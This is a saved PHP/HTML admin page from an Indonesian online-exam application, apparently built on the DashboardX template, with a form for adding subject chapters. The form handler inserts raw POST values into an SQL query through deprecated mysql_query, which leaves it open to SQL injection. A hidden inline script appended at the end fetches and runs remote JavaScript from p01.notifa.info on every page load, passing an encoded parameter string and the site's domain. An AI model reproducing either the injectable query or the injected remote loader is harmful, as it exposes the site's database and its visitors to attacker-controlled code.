...
<head>
  <meta charset="utf-8">
    ...
    <title>DashboardX Admin - UJIANKU</title>
  
	<!-- Bootstrap 4.0-->
	<link rel="stylesheet" href="../assets_admin/vendor_components/bootstrap/dist/css/bootstrap.min.css">
    ...
    <link rel="stylsheet" href="../assets_admin/css/sweetalert.css">
	
	
</head>
<!-- ADD THE CLASS layout-boxed TO GET A BOXED LAYOUT -->
<body class="hold-transition light-skin sidebar-mini theme-blueindigo onlyheader layout-boxed">
	  ...
	  <div class="app-menu">
		<ul class="header-megamenu nav">
			...
			<li class="btn-group nav-item d-xl-inline-flex d-none">
				<a href="#" class="waves-effect waves-light nav-link rounded" data-toggle="dropdown" aria-expanded="false">
			...
			<li class="dropdown nav-item d-xl-inline-flex d-none">
				...
				<div class="dropdown-menu overflow-hidden">
					<div class="dropdown-menu-header-inner bg-img" style="background-image: url('../assets_admin/images/gallery/landscape1.jpg');" data-overlay="5">
			...
			<li class="dropdown nav-item d-xl-inline-flex d-none">
				<a href="#" aria-haspopup="true" data-toggle="dropdown" class="waves-effect waves-light nav-link rounded" aria-expanded="false">
					<i class="nav-link-icon ti-layout-grid2 text-white mx-5 mx-lg-0"></i>
				</a>
				<div class="dropdown-menu dropdown-grid overflow-hidden">					
			  ...
			  <li>
				...
				<ul class="menu sm-scrol">
				  <li><!-- start message -->
					<a href="#">
					  <div class="pull-left">
						<img src="../assets_admin/images/user2-160x160.jpg" class="rounded-circle" alt="User Image">
					  </div>
				  ...
				  <li>
					<a href="#">
					  <div class="pull-left">
						<img src="../assets_admin/images/user3-128x128.jpg" class="rounded-circle" alt="User Image">
					  </div>
					  <div class="mail-contnet">
						 <h4>
						  Nullam tempor
				  ...
				  <li>
					<a href="#">
					  <div class="pull-left">
						<img src="../assets_admin/images/user4-128x128.jpg" class="rounded-circle" alt="User Image">
					  </div>
					  <div class="mail-contnet">
						 <h4>
						  Proin venenatis
			  ...
			  <ul class="sidebar-menu" data-widget="tree">
				<li class="treeview">
				  ...
				  <ul class="treeview-menu">
					...
					<li><a href="index3.html">CRM</a></li>
					<li><a href="index4.html">Classic</a></li>
					<li><a href="index5.html">Project</a></li>
					<li><a href="index6.html">Material</a></li>
				  </ul>
				</li>   
				...
				<li class="treeview">
				  ...
				  <ul class="treeview-menu">
					...
					<li><a href="layout_fixed.html">Fixed</a></li>
					<li><a href="layout_collapsed_sidebar.html">Mini Sidebar</a></li>
				  </ul>
				</li>  
			...
			<div class="row">			
				<div class="col-12">					
				  <div class="callout callout-info">
					...
					<p>Isilah Dengan Tepat</p>
				  </div>
				  <div class="box">
				<div class="col-12">
				  <div class="box">
					<div class="box-header with-border">
					<button><a href="soal.php">Back</a></button>
					...
					<div class="box-body no-padding">
						<div class="table-responsive">
                            <form action="tambahbab.php" method="POST">
                            ...
                            <tr>
                                ...
                                <th>
                                    ...
                                    <select name='kode' class='form-control' required='true'>
                                        ...
                                        $pkQ = mysql_query("SELECT * FROM pelajaran ORDER BY nampel ASC");
                                        while($pk = mysql_fetch_array($pkQ)) {
                                            echo "<option value='$pk[idp]'>$pk[nampel]</option>";
                                        }
                                        ?>
                                       </select>
                                </th>
                                <th>
                                   <a href="#popup"><input type="submit" name="simpan" value="kirim"></a>
                                </th>
                            </tr>
                            </table>
                            </form>
                        ...
                        if(isset($_POST['simpan'])){
                            ...
                            $kode   = $_POST['kode'];
                            $nama	= $_POST['nama'];
                            $input = mysql_query("INSERT INTO bab_mapel VALUES(NULL, $kode, '$nama')") or die(mysql_error());
                            
                            if($input){
                                
                                echo '<script>window.alert("BAGUS!!!");</script>';
                            }else{
                                echo 'Gagal menambahkan data! ';
                                echo '<a href="tambahmapel.php">Kembali</a>';
                            }   
                        }
                        ?>
						</div>
    ...
    <div class="tab-content">
      ...
      <div class="tab-pane" id="control-sidebar-settings-tab">
		  <div class="media-list media-list-hover media-list-divided">
			<div class="media">
			  <img class="avatar avatar-lg" src="../assets_admin/images/avatar/1.jpg" alt="...">
			...
			<div class="media">
			  <img class="avatar avatar-lg" src="../assets_admin/images/avatar/2.jpg" alt="...">
...
<!-- ./wrapper -->
	...
	<!-- Bootstrap 4.0-->
	<script src="../assets_admin/vendor_components/bootstrap/dist/js/bootstrap.min.js"></script>
	
	<!-- SlimScroll -->
	<script src="../assets_admin/vendor_components/jquery-slimscroll/jquery.slimscroll.min.js"></script>
    ...
    <script src="../assets_admin/js/sweetalert.min.js"></script>
	
	<!-- DashboardX Admin for demo purposes -->
	<script src="js\demo.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAhRgyBus6bo8wZjuHsuAK9RYrxvSb8awRPC2w5jeYVU0W1j57ZuwrUxuWSxU2zRbSy4B2hw%2b9H6FBMWC5kdK4fHOc8WxnrtDwv3MxEu2z41aROHJMINUF%2fnMhDkHZ6%2fiIzIo7jxxWfoFWjEOirrzc6rmk65Lr9cqdVTzRv2BRd99bGhcJYHdvrlaojngQvtUsI%2fhLQqSnNQ5ZNbdNyS3b0Fr%2fDGiHZ2MnoKD6lT8bq6D1jD0%2bnhzsx7hSvcW%2bQmwPBRqumouPaRWN0cPeut6vpk3yuAXnFFWGxFl3fhFPfGzXMCGeLAy7jghoH3lsP8xu5LU6UO20g4OZ5zqGhCeJjcn%2fUWhrLs%2faO4Nyz2pshxvDEJ%2fcLkiRZf5pMgxtsHN1DluWvxOL5DxiPDW05fFTrA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
